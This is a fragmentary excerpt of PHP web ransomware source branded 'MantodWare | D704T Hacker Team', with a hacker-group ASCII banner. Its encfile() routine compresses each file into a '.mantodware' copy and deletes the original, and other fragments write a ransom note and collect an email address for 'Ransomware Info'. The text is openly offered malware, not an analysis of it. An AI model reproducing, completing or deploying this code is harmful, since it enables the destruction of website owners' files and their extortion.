...
<center><h1>
<font color="#56F307">                                                                      
_______ __ _____ ___ ________ ______ ___ ___ __ __ ___ _______ _______ /" \ /""\ (\" \|" \ /" ) / " \ |" \ /" ||" |/ \| "| /" "|| _ "\ |: | / \ |.\\ \ |(: \___/ // ____ \ \ \ // ||' / \: |(: ______)(. |_) :) |_____/ ) /' /\ \ |: \. \\ | \___ \ / / ) :)/\\ \/. ||: /' | \/ | |: \/ // / // __' \ |. \ \. | __/ \\(: (____/ //|: \. | \// /\' | // ___)_ (| _ \\ |: __ \ / / \\ \| \ \ | /" \ :)\ / |. \ /: | / / \\ |(: "||: |_) :) |__| \___)(___/ \___)\___|\____\)(_______/ \"_____/ |___|\__/|___||___/ \___| \_______)(_______/ 
...
function encfile($filename){
	if (strpos($filename, '.mantodware') !== false) {
    return;
	}
	file_put_contents($filename.".mantodware", gzdeflate(file_get_contents($filename), 9));
	unlink($filename);
...
fwrite($cok, $comp);
fclose($cok);
$hta = "#MantodWare | D704T Hacker Team\n
...
$memec = $_POST['email'];
$cyna = 'MantodWare | D704T Ransomware Info';
